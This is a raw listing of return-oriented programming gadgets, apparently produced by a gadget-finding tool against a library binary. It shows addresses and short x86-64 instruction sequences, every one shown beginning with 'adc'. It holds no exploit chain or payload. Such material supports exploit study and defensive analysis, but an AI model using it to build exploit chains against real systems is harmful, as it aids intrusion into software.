0x00002aaaaabc20b0 : adc byte ptr [rcx + rcx*4 + 0x78], al ; or byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab49fe7 : adc byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x00002aaaaab5af83 : adc byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rax ; pop rbx ; pop rbp ; pop r12 ; jmp rcx
0x00002aaaaab5a4ab : adc byte ptr [rcx + rcx*4 - 0x1a], cl ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaab41478 : adc byte ptr [rcx + rcx*4 - 0x20], cl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab7e312 : adc byte ptr [rcx - 0x12cfe7b1], cl ; mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaab7e2f2 : adc byte ptr [rcx - 0x12cfe8b1], cl ; mov byte ptr [rdi + 0x1b], ch ; ret
0x00002aaaaac6a970 : adc byte ptr [rcx - 0x5f6f0004], ah ; cld ; call qword ptr [rax]
0x00002aaaaac46f88 : adc byte ptr [rcx - 0x75], cl ; sbb byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaabd2c32 : adc byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab081b0 : adc byte ptr [rcx - 0x77], cl ; ret 0x1274
0x00002aaaaabd2cb2 : adc byte ptr [rcx - 0x77], cl ; ret 0x8348
0x00002aaaaabb812c : adc byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x00002aaaaab8d148 : adc byte ptr [rcx - 0x7cb7e8cc], cl ; ret 0x4804
0x00002aaaaab8d0cc : adc byte ptr [rcx - 0x7cb7eecc], cl ; ret 0x4804
0x00002aaaaab53b87 : adc byte ptr [rcx - 0x7d], al ; ret 0x4801
0x00002aaaaac03ef1 : adc byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaabb80d7 : adc byte ptr [rcx - 0x7d], cl ; ret 0x4201
0x00002aaaaab8db8b : adc byte ptr [rcx - 0x7d], cl ; ret 0x4810
0x00002aaaaac19293 : adc byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00002aaaaac0411f : adc byte ptr [rcx - 0x7d], cl ; ret 0x8320
0x00002aaaaac1ce37 : adc byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x00002aaaaac710d0 : adc byte ptr [rcx - 3], dh ; jmp qword ptr [rdi]
0x00002aaaaab8e774 : adc byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac69894 : adc byte ptr [rcx], al ; cld ; push rax ; add bh, ah ; call rax
0x00002aaaaab81f15 : adc byte ptr [rcx], bh ; je 0xacf28 ; test edx, edx ; jne 0xacf1a ; ret
0x00002aaaaac0318d : adc byte ptr [rcx], bh ; ret
0x00002aaaaab0fd3e : adc byte ptr [rcx], ch ; ret 0xc269
0x00002aaaaab51895 : adc byte ptr [rcx], ch ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x00002aaaaac69a24 : adc byte ptr [rcx], dh ; cld ; call qword ptr [rax]
0x00002aaaaab4a04f : adc byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab5aec9 : adc byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaabf8547 : adc byte ptr [rcx], dh ; rol byte ptr [rax + rcx*4 + 0x5e], 3 ; pop rbx ; ret
0x00002aaaaabd123d : adc byte ptr [rcx], dh ; ror byte ptr [rax + 0x39], 0xd7 ; ja 0xfc279 ; ret
0x00002aaaaabe32f3 : adc byte ptr [rdi + 0x2000004], bh ; call rax
0x00002aaaaab9bcd6 : adc byte ptr [rdi - 0x36], bh ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac69fa0 : adc byte ptr [rdi - 4], dl ; call qword ptr [rax + 0x10fffc56]
0x00002aaaaac718f0 : adc byte ptr [rdi], 0xe9 ; call qword ptr [rbx]
0x00002aaaaac71950 : adc byte ptr [rdi], 0xe9 ; jmp qword ptr [rax]
0x00002aaaaac83dc0 : adc byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab02e55 : adc byte ptr [rdi], cl ; mov bh, 0xc0 ; ret
0x00002aaaaabed81a : adc byte ptr [rdi], cl ; mov bh, 0xc6 ; or eax, edi ; bswap eax ; ret
0x00002aaaaab5d7d3 : adc byte ptr [rdi], cl ; mov dh, 0xc ; adc dword ptr [rax - 0x7d], ecx ; ret 0x8801
0x00002aaaaab0ad72 : adc byte ptr [rdi], cl ; ret 0x8b48
0x00002aaaaab09e07 : adc byte ptr [rdi], cl ; sub cl, al ; jne 0x34e22 ; add rsp, 0x28 ; ret
0x00002aaaaac3cce8 : adc byte ptr [rdi], cl ; test dword ptr [rcx + 5], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac44d53 : adc byte ptr [rdi], cl ; test edx, esi ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x00002aaaaac1a481 : adc byte ptr [rdi], cl ; xchg ah, bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1a571 : adc byte ptr [rdi], cl ; xchg ah, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1a391 : adc byte ptr [rdi], cl ; xchg ah, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac21cab : adc byte ptr [rdi], cl ; xchg bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac207af : adc byte ptr [rdi], cl ; xchg bl, cl ; adc eax, 0x83480000 ; ret 0xe910
0x00002aaaaac219af : adc byte ptr [rdi], cl ; xchg bl, cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac210af : adc byte ptr [rdi], cl ; xchg bl, cl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac213af : adc byte ptr [rdi], cl ; xchg bl, cl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac20aa7 : adc byte ptr [rdi], cl ; xchg bl, dl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1add9 : adc byte ptr [rdi], cl ; xchg byte ptr [rax + rax - 0x7cb80000], al ; ret 0xeb10
0x00002aaaaac1a931 : adc byte ptr [rdi], cl ; xchg byte ptr [rax - 0x7cb80000], ch ; ret 0xeb10
0x00002aaaaac1a0c1 : adc byte ptr [rdi], cl ; xchg byte ptr [rbp + rcx - 0x7cb80000], bl ; ret 0xeb10
0x00002aaaaac1ab11 : adc byte ptr [rdi], cl ; xchg byte ptr [rbx + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1a2a1 : adc byte ptr [rdi], cl ; xchg byte ptr [rbx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x00002aaaaac1acf1 : adc byte ptr [rdi], cl ; xchg byte ptr [rcx + rax], ch ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1ac01 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1a543 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a633 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a453 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac20d54 : adc byte ptr [rdi], cl ; xchg byte ptr [rsi], ah ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac21954 : adc byte ptr [rdi], cl ; xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac21c54 : adc byte ptr [rdi], cl ; xchg byte ptr [rsi], ah ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac21354 : adc byte ptr [rdi], cl ; xchg byte ptr [rsi], ah ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac21054 : adc byte ptr [rdi], cl ; xchg byte ptr [rsi], ah ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac20a4c : adc byte ptr [rdi], cl ; xchg byte ptr [rsi], ch ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a1b1 : adc byte ptr [rdi], cl ; xchg byte ptr [rsp + rcx - 0x7cb80000], ch ; ret 0xeb10
0x00002aaaaac1e0dd : adc byte ptr [rdi], cl ; xchg ch, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1defd : adc byte ptr [rdi], cl ; xchg ch, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1e8d5 : adc byte ptr [rdi], cl ; xchg ch, dh ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1d7f5 : adc byte ptr [rdi], cl ; xchg ch, dl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1e6f5 : adc byte ptr [rdi], cl ; xchg ch, dl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1a363 : adc byte ptr [rdi], cl ; xchg dl, bh ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a183 : adc byte ptr [rdi], cl ; xchg dl, bl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a273 : adc byte ptr [rdi], cl ; xchg dl, ch ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a093 : adc byte ptr [rdi], cl ; xchg dl, cl ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaab0ade3 : adc byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x5489
0x00002aaaaab6eb48 : adc byte ptr [rdi], cl ; xchg eax, ebx ; ret
0x00002aaaaab0c37e : adc byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3948
0x00002aaaaab0cecb : adc byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3949
0x00002aaaaabc20b9 : adc byte ptr [rdi], cl ; xchg eax, esp ; ret 0x5408
0x00002aaaaac59c0d : adc byte ptr [rdi], dl ; pop r10 ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00002aaaaab0c8ec : adc byte ptr [rdi], r9b ; xchg eax, ebx ; ret 0x3948
0x00002aaaaaad8955 : adc byte ptr [rdx + 0x71], bh ; xchg eax, ebx ; and cl, ah ; ret
0x00002aaaaac259f9 : adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00002aaaaab37031 : adc byte ptr [rdx + rdx*8 - 0x76b7d08c], al ; ret
0x00002aaaaac6a968 : adc byte ptr [rdx - 0x5e6f0004], ah ; cld ; call qword ptr [rax]
0x00002aaaaaad57b6 : adc byte ptr [rdx], ah ; add byte ptr [rax], al ; adc al, byte ptr [rax] ; add byte ptr [rbx + 1], al ; ret 0x102
0x00002aaaaac4146c : adc byte ptr [rdx], al ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac698f8 : adc byte ptr [rdx], al ; cld ; push rax ; add edi, esp ; jmp rax
0x00002aaaaabcbb3e : adc byte ptr [rdx], al ; cmove eax, edx ; add rsp, 0x60 ; pop rbx ; ret
0x00002aaaaabfc7af : adc byte ptr [rdx], al ; je 0x1277bc ; ret
0x00002aaaaac5c42c : adc byte ptr [rdx], al ; jmp qword ptr [rax]
0x00002aaaaac69994 : adc byte ptr [rdx], ch ; cld ; push rax ; sub edi, esp ; call rax
0x00002aaaaac4343b : adc byte ptr [rdx], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac69aa8 : adc byte ptr [rdx], dh ; cld ; call qword ptr [rax]
0x00002aaaaac6928c : adc byte ptr [rip + 0x1e80fffb], cl ; sti ; jmp qword ptr [rax]
0x00002aaaaac692cc : adc byte ptr [rip + 0x3a40fffb], bl ; sti ; jmp qword ptr [rax]
0x00002aaaaac14c2d : adc byte ptr [rip - 0x3fcf0000], al ; pop rbx ; ret
0x00002aaaaab09f13 : adc byte ptr [rip - 0x8000], cl ; inc eax ; shr eax, 0x1f ; ret
0x00002aaaaac432ea : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret
0x00002aaaaac428e5 : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac428e0 : adc byte ptr [rsi + 0xf], ah ; out dx, eax ; push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab5e335 : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x00002aaaaab6427b : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x00002aaaaab7a4ab : adc byte ptr [rsi + 0xf], ah ; xlatb ; ror byte ptr [rcx - 0x7d], 1 ; ret 0x4d10
0x00002aaaaab7a4aa : adc byte ptr [rsi + 0xf], r12b ; xlatb ; ror byte ptr [rcx - 0x7d], 1 ; ret 0x4d10
0x00002aaaaab7e2d3 : adc byte ptr [rsi - 0x77], ah ; sbb byte ptr [r8], r14b ; in eax, dx ; mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaac7dd00 : adc byte ptr [rsi - 0xf], 0xff ; ret
0x00002aaaaac69fa8 : adc byte ptr [rsi - 4], dl ; call qword ptr [rax + 0x10fffc55]
0x00002aaaaab0ffea : adc byte ptr [rsp + 8], al ; add rsp, 0x18 ; ret
0x00002aaaaaad5453 : adc byte ptr [rsp + rcx], bl ; ret 0x4412
0x00002aaaaac69b8c : adc byte ptr [rsp + rdi*8 - 1], bl ; cmpsb byte ptr [rsi], byte ptr [rdi] ; pop rbx ; cld ; call qword ptr [rsi]
0x00002aaaaac69fb8 : adc byte ptr [rsp + rdi*8 - 1], dl ; nop ; push rbx ; cld ; call qword ptr [rax]
0x00002aaaaab8fd4a : adc byte ptr [rsp - 0x10], al ; ret
0x00002aaaaab1f18f : adc byte ptr [rsp - 4], al ; ret
0x00002aaaaab1f1d5 : adc byte ptr [rsp - 8], al ; ret
0x00002aaaaac20d57 : adc byte ptr es:[rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab59735 : adc byte ptr es:[rax], al ; movsxd rdx, dword ptr [rax + rbx*4] ; add rax, rdx ; jmp rax
0x00002aaaaac59e99 : adc ch, byte ptr [rip + 0x8acc8c6] ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00002aaaaac5c270 : adc ch, ch ; int1 ; jmp qword ptr [rax]
0x00002aaaaac6b201 : adc ch, dl ; dec esp ; add byte ptr [rax], 0 ; xchg eax, esp ; adc ch, dl ; jmp rsp
0x00002aaaaac6b209 : adc ch, dl ; jmp rsp
0x00002aaaaac82a10 : adc cl, 0xf4 ; jmp rcx
0x00002aaaaab73995 : adc cl, byte ptr [rax + 0x29] ; ret
0x00002aaaaab90a3e : adc cl, byte ptr [rax + 0x29] ; ret 0x6948
0x00002aaaaab909bf : adc cl, byte ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab7ec83 : adc cl, byte ptr [rax - 0x2f] ; call 0xffffffffc30f29df
0x00002aaaaab7abf3 : adc cl, byte ptr [rax - 0x73] ; jg 0xa5c15 ; jne 0xa628b ; ret
0x00002aaaaab7c2d7 : adc cl, byte ptr [rax - 0x73] ; jg 0xa72f9 ; jne 0xa7a9b ; ret
0x00002aaaaab1fcef : adc cl, byte ptr [rax - 0x75] ; adc cl, byte ptr [rbx + rcx*4 + 0x74] ; ret 0x4c40
0x00002aaaaab73cad : adc cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaabd2a08 : adc cl, byte ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaab1c09d : adc cl, byte ptr [rax - 0x7d] ; call 0xffffffffc33db8ad
0x00002aaaaabd3dde : adc cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaabb7ebc : adc cl, byte ptr [rax - 0x7d] ; ret 0x4001
0x00002aaaaab6fb44 : adc cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaab5deb5 : adc cl, byte ptr [rax - 1] ; ret 0x2288
0x00002aaaaab1fcf2 : adc cl, byte ptr [rbx + rcx*4 + 0x74] ; ret 0x4c40
0x00002aaaaab7702f : adc cl, byte ptr [rcx + 5] ; movlpd qword ptr [rdx + 5], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab7704f : adc cl, byte ptr [rcx + 6] ; movlpd qword ptr [rdx + 6], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab7706f : adc cl, byte ptr [rcx + 7] ; movlpd qword ptr [rdx + 7], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab79bbf : adc cl, byte ptr [rcx + 8] ; movlpd qword ptr [rdx + 8], xmm1 ; mov rax, rdi ; ret
0x00002aaaaab8cec4 : adc cl, byte ptr [rcx - 0x7cb7e8cc] ; ret 0x4804
0x00002aaaaab1e5a1 : adc cl, byte ptr [rcx - 0x7d] ; ret
0x00002aaaaab47854 : adc cl, byte ptr [rcx - 0x7d] ; ret 0x4410
0x00002aaaaab298df : adc cl, ch ; ret
0x00002aaaaab63760 : adc dh, bh ; ret
0x00002aaaaac00b4e : adc dh, dh ; ret 0x7401
0x00002aaaaab55c4e : adc dh, dh ; ret 0xf0f
0x00002aaaaaad72e3 : adc dh, dl ; ret
0x00002aaaaabd5dda : adc dl, byte ptr [rsp + rbp] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba48ae : adc dword ptr [rax + 0x17b80], 0x8348a874 ; ret
0x00002aaaaaafa946 : adc dword ptr [rax + 0x39], ecx ; ret 0x8840
0x00002aaaaab1df13 : adc dword ptr [rax + 1], ecx ; ror byte ptr [rax + 0x39], 1 ; ret 0x8949
0x00002aaaaabca186 : adc dword ptr [rax + 9], edi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac285e6 : adc dword ptr [rax + rax], eax ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab0efc4 : adc dword ptr [rax + rcx*2 + 0x33], esp ; adc al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x00002aaaaaaf5848 : adc dword ptr [rax + rcx*2 + 0x33], esp ; add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x00002aaaaab0a31d : adc dword ptr [rax + rcx*2 + 0x33], esp ; add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; jmp rax
0x00002aaaaabfd4a1 : adc dword ptr [rax + rcx*2 + 0x33], esp ; cmp al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x00002aaaaab49075 : adc dword ptr [rax - 0x3f], ecx ; cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x00002aaaaac69400 : adc dword ptr [rax - 0x575e0003], ebp ; std ; inc dword ptr [rcx - 0x57] ; std ; jmp rcx
0x00002aaaaab1e5ec : adc dword ptr [rax - 0x73], ecx ; add dword ptr [rax + 0x39], ecx ; ret 0x8948
0x00002aaaaab7abce : adc dword ptr [rax - 0x73], ecx ; jg 0xa5bef ; jne 0xa628b ; ret
0x00002aaaaab7c2b2 : adc dword ptr [rax - 0x73], ecx ; jg 0xa72d3 ; jne 0xa7a9b ; ret
0x00002aaaaab4626e : adc dword ptr [rax - 0x73], ecx ; jno 0x71282 ; mov qword ptr [rdx + 0x20], rsi ; mov dword ptr [rcx], eax ; ret
0x00002aaaaac487ab : adc dword ptr [rax - 0x75], ecx ; cmp ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab9c906 : adc dword ptr [rax - 0x77], ecx ; adc byte ptr [r8 - 0x77], cl ; out dx, al ; xor edx, edx ; jmp 0xc78e0
0x00002aaaaab8a05e : adc dword ptr [rax - 0x77], ecx ; lodsb al, byte ptr [rsi] ; and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], al ; ret
0x00002aaaaab0f51e : adc dword ptr [rax - 0x77], ecx ; ret
0x00002aaaaab52fd5 : adc dword ptr [rax - 0x77], ecx ; ret 0x8348
0x00002aaaaab5183c : adc dword ptr [rax - 0x77], ecx ; ret 0x8b48
0x00002aaaaabe97eb : adc dword ptr [rax - 0x7b], ecx ; sal byte ptr [rbp - 0x11], cl ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaab8d0cf : adc dword ptr [rax - 0x7d], ecx ; ret 0x4804
0x00002aaaaabad426 : adc dword ptr [rax - 0x7d], ecx ; ret 0x8301
0x00002aaaaab5d7d7 : adc dword ptr [rax - 0x7d], ecx ; ret 0x8801
0x00002aaaaac1f2fb : adc dword ptr [rax], 0x83480000 ; ret 0x4910
0x00002aaaaac7107d : adc dword ptr [rax], eax ; add al, ah ; in eax, -0x18 ; call qword ptr [rdx]
0x00002aaaaac13419 : adc dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabe5859 : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac1b887 : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1d7f9 : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac4874b : adc dword ptr [rax], eax ; add byte ptr [rax], al ; nop ; ret
0x00002aaaaac710cd : adc dword ptr [rax], eax ; add byte ptr [rax], dl ; jno 0x19c0d6 ; jmp qword ptr [rdi]
0x00002aaaaab3a89c : adc dword ptr [rax], eax ; add dh, dh ; ret
0x00002aaaaaaff6ce : adc dword ptr [rax], eax ; mov qword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x00002aaaaaafec44 : adc dword ptr [rax], eax ; mov rdi, rbx ; call r12
0x00002aaaaab40c82 : adc dword ptr [rax], eax ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab41bb9 : adc dword ptr [rax], eax ; movsxd rdx, dword ptr [rcx + rdx*4] ; add rcx, rdx ; jmp rcx
0x00002aaaaab41a9b : adc dword ptr [rax], eax ; movsxd rsi, dword ptr [rdi + rsi*4] ; add rdi, rsi ; jmp rdi
0x00002aaaaac7107c : adc dword ptr [rax], r8d ; add al, ah ; in eax, -0x18 ; call qword ptr [rdx]
0x00002aaaaab6b76a : adc dword ptr [rbp + 0x38], eax ; ror byte ptr [rdi], 1 ; xchg eax, esp ; ret
0x00002aaaaab28f68 : adc dword ptr [rbx], 0x440f4c00 ; ret 0xf4c
0x00002aaaaab10172 : adc dword ptr [rbx], eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabad408 : adc dword ptr [rcx + 0x39], ecx ; ret 0xc76
0x00002aaaaab742d0 : adc dword ptr [rcx + 6], esi ; vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x00002aaaaab742d7 : adc dword ptr [rcx + 7], edi ; ret
0x00002aaaaac693d4 : adc dword ptr [rcx - 0x5e1e0003], esp ; std ; jmp rcx
0x00002aaaaac5d5c8 : adc dword ptr [rcx - 0xc], edx ; lcall ptr [rbx] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab73f72 : adc dword ptr [rcx - 1], ebx ; ret
0x00002aaaaab73f36 : adc dword ptr [rcx - 1], edi ; ret
0x00002aaaaab73f6b : adc dword ptr [rcx - 2], edx ; vmovups zmmword ptr [r9 - 0x40], zmm3 ; ret
0x00002aaaaab74169 : adc dword ptr [rcx - 2], esi ; vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x00002aaaaab73f2f : adc dword ptr [rcx - 2], esi ; vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x00002aaaaac81125 : adc dword ptr [rcx], eax ; add al, bl ; fpatan ; call qword ptr [rbx]
0x00002aaaaac105ee : adc dword ptr [rcx], eax ; ja 0x13b622 ; mov rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaabe0de6 : adc dword ptr [rcx], esi ; rcr byte ptr [rbx - 0x77], cl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaab48056 : adc dword ptr [rcx], esi ; rol byte ptr [rbx - 0x6af00002], 0xc0 ; neg eax ; ret
0x00002aaaaac5833a : adc dword ptr [rdi + 0x5fa022da], 0xd849416 ; ret 0xbe57
0x00002aaaaab74432 : adc dword ptr [rdi - 7], esi ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00002aaaaab74439 : adc dword ptr [rdi - 8], edi ; ret
0x00002aaaaab09c05 : adc dword ptr [rdi], eax ; and eax, 0x80000000 ; movd xmm0, eax ; ret
0x00002aaaaab0984f : adc dword ptr [rdi], eax ; and rax, rdx ; movq xmm0, rax ; ret
0x00002aaaaab098c4 : adc dword ptr [rdi], ecx ; ret
0x00002aaaaab0988d : adc dword ptr [rdi], ecx ; subsd xmm0, xmm1 ; ret
0x00002aaaaab09c22 : adc dword ptr [rdi], ecx ; subss xmm0, xmm1 ; ret
0x00002aaaaab7ea0c : adc dword ptr [rdi], edx ; vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x00002aaaaab73228 : adc dword ptr [rdx + rdx*8 - 0x2dce148b], eax ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab7eb38 : adc dword ptr [rsi + 2], edx ; vmovups zmmword ptr [rsi + 0xc0], zmm2 ; ret
0x00002aaaaab7eb3f : adc dword ptr [rsi + 3], edx ; ret
0x00002aaaaab7ebd5 : adc dword ptr [rsi + 6], edx ; vmovups zmmword ptr [rsi + 0x1c0], zmm2 ; ret
0x00002aaaaab7ebdc : adc dword ptr [rsi + 7], edx ; ret
0x00002aaaaabb5412 : adc dword ptr [rsi + rsi + 0x48], esi ; mov edx, eax ; jmp 0xe03b4
0x00002aaaaab7e9de : adc dword ptr [rsi - 1], edx ; ret
0x00002aaaaab7e9d7 : adc dword ptr [rsi - 2], edx ; vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x00002aaaaac1b886 : adc dword ptr es:[rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab7f3da : adc eax, 0x10ef8348 ; add rax, rdi ; ret
0x00002aaaaab413f5 : adc eax, 0x11a63e ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab40c7f : adc eax, 0x11a7dc ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab7ac54 : adc eax, 0x157f8d48 ; jne 0xa628b ; ret
0x00002aaaaab7c368 : adc eax, 0x157f8d48 ; jne 0xa7a9b ; ret
0x00002aaaaac69271 : adc eax, 0x1630fffb ; sti ; jmp qword ptr [rax]
0x00002aaaaabb3097 : adc eax, 0x1fffffe ; ret 0x8b49
0x00002aaaaac48386 : adc eax, 0x20478b48 ; test rax, rax ; je 0x1733a1 ; call rax
0x00002aaaaac48650 : adc eax, 0x25 ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaac4876b : adc eax, 0x252108 ; je 0x17377a ; ret
0x00002aaaaac15187 : adc eax, 0x284284 ; add rsp, 8 ; ret
0x00002aaaaab109c8 : adc eax, 0x2850f00 ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaac0c629 : adc eax, 0x290972 ; mov qword ptr fs:[rax], rdx ; ret
0x00002aaaaac021c2 : adc eax, 0x2959b9 ; mov rax, qword ptr [rdx + rax*8] ; jmp rax
0x00002aaaaabdd9bf : adc eax, 0x2ba87c ; je 0x1089d0 ; pop rbp ; ret
0x00002aaaaabddb25 : adc eax, 0x2bd88e ; add word ptr [rdx + rax*2], 1 ; ret
0x00002aaaaac5cecc : adc eax, 0x2bfff3bc ; mov dl, 0xf3 ; jmp rsp
0x00002aaaaabd3e6e : adc eax, 0x2c727d ; add rsp, 8 ; ret
0x00002aaaaabbeab2 : adc eax, 0x2d94b1 ; mov dword ptr [rdx], ecx ; pop rdx ; pop rcx ; pop rbx ; ret
0x00002aaaaabbbf12 : adc eax, 0x2dc091 ; mov rax, qword ptr [rdx] ; mov qword ptr [rdx], rdi ; ret
0x00002aaaaab104f8 : adc eax, 0x33850f00 ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
